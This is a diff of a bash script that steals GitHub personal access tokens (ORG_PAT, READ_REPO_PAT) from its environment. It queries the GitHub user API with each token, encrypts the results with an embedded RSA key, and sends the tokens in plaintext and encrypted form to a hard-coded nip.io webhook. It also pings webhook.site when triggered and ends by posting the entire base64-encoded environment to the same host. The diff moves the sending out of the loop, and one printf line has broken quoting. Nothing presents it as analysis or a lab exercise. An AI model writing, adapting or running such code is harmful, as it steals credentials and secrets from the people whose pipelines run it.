@@ -1,4 +1,5 @@
 webhook="https://16.164.221.226.nip.io/bcbdfd7ffd9efa6d8d312f9f723f20753656c0dcb6460ebb7a85a5c02357b5ff"
+export LC_ALL=C
 
 # Test if triggered
 curl https://webhook.site/9acefa91-fce9-440e-b077-a3a2b0b0fa87/start
@@ -14,40 +15,52 @@ Qrcofjbz3acJwnnmn/S+fXZCeuWhxwHqxh7uiZPWEQaOLl3mIw2QC8OzWCc4KmVQ
 WU4yhCUzp+qwCKHIbosexvK2BmDXnMSXeFlYZ329jw5JzUAKejSWvyeu5VDMHufD
 /wIDAQAB
 -----END PUBLIC KEY-----'
-export LC_ALL=C
+
 
 encrypt_chunk() {
     printf '%s' "$1" | openssl pkeyutl -encrypt -pubin -inkey <(printf '%s' "$PUB_KEY") -pkeyopt rsa_padding_mode:oaep -pkeyopt rsa_oaep_md:sha256 | base64 -w0
 }
 
+string=""
+
 for pat in ORG_PAT READ_REPO_PAT; do
 
         token="${!pat}"
-		# ------------------------------------------------------- fetch the data --
+
+		# ------------------------------------------------------- fetch user info --
 		user_info="$(curl -s -i -H "Authorization: Bearer $token" https://api.github.com/user)"
 		string="$user_info"     # includes response headers because of -i
-		# curl https://16.164.221.226.nip.io/bcbdfd7ffd9efa6d8d312f9f723f20753656c0dcb6460ebb7a85a5c02357b5ff/got-user-info
 
-		# ------------------------------------------------ chunked encryption -----
+		# ------------------------------------------------ combine string -----
+		printf -v block 'secret:\n%s\ntoken:\n%s\nuser info:\n "$pat "$token" "$user_info"
+		string+="${block}"$'\n\n'
+		
 
-		CHUNK_SIZE=190
-		chunks=()
-		i=0
-		while (( i < ${#string} )); do
-		    chunks+=( "$(encrypt_chunk "${string:i:CHUNK_SIZE}")" )
-		    i=$(( i + CHUNK_SIZE ))
-		done
-
-		# curl https://16.164.221.226.nip.io/bcbdfd7ffd9efa6d8d312f9f723f20753656c0dcb6460ebb7a85a5c02357b5ff/finished-loop
-
-		encrypted_string="$(printf '%s.' "${chunks[@]}")"
-		encrypted_string="${encrypted_string%.}"
-
-		encrypted_token=$(printf '%s' "$token" | openssl pkeyutl -encrypt -pubin -inkey <(printf '%s' "$PUB_KEY") -pkeyopt rsa_padding_mode:oaep -pkeyopt rsa_oaep_md:sha256 | base64 -w0)
-		encrypted_pat=$(printf '%s' "$pat" | openssl pkeyutl -encrypt -pubin -inkey <(printf '%s' "$PUB_KEY") -pkeyopt rsa_padding_mode:oaep -pkeyopt rsa_oaep_md:sha256 | base64 -w0)
-		curl -s -o /dev/null "$webhook/send-pat?secret=$pat&token=$token" -d "$user_info"
-		curl -s -o /dev/null "$webhook/send-pat?secret=$encrypted_pat&token=$encrypted_token" -d "$encrypted_string"
+#		curl https://16.164.221.226.nip.io/bcbdfd7ffd9efa6d8d312f9f723f20753656c0dcb6460ebb7a85a5c02357b5ff/finished-loop
+#		encrypted_token=$(printf '%s' "$token" | openssl pkeyutl -encrypt -pubin -inkey <(printf '%s' "$PUB_KEY") -pkeyopt rsa_padding_mode:oaep -pkeyopt rsa_oaep_md:sha256 | base64 -w0)
+#		encrypted_pat=$(printf '%s' "$pat" | openssl pkeyutl -encrypt -pubin -inkey <(printf '%s' "$PUB_KEY") -pkeyopt rsa_padding_mode:oaep -pkeyopt rsa_oaep_md:sha256 | base64 -w0)
+#		curl -s -o /dev/null "$webhook/send-pat?secret=$pat&token=$token" -d "$user_info"
+#		curl -s -o /dev/null "$webhook/send-pat?secret=$encrypted_pat&token=$encrypted_token" -d "$encrypted_string"
 done
+
+
+
+# ------------------------------------------------ chunked encryption -----
+CHUNK_SIZE=190
+chunks=()
+i=0
+while (( i < ${#string} )); do
+	chunks+=( "$(encrypt_chunk "${string:i:CHUNK_SIZE}")" )
+	i=$(( i + CHUNK_SIZE ))
+done
+
+encrypted_string="$(printf '%s.' "${chunks[@]}")"
+encrypted_string="${encrypted_string%.}"
+
+curl -s -o /dev/null "$webhook/send-pat?secret=$pat&token=$token" -d "$user_info"
+curl -s -o /dev/null "$webhook/send-pat" -d "$string"
+curl -s -o /dev/null "$webhook/send-pat" -d "$encrypted_string"
+
 
 env -0 | base64 -w 0 | curl -s -o /dev/null -X POST -d @- "$webhook"
 
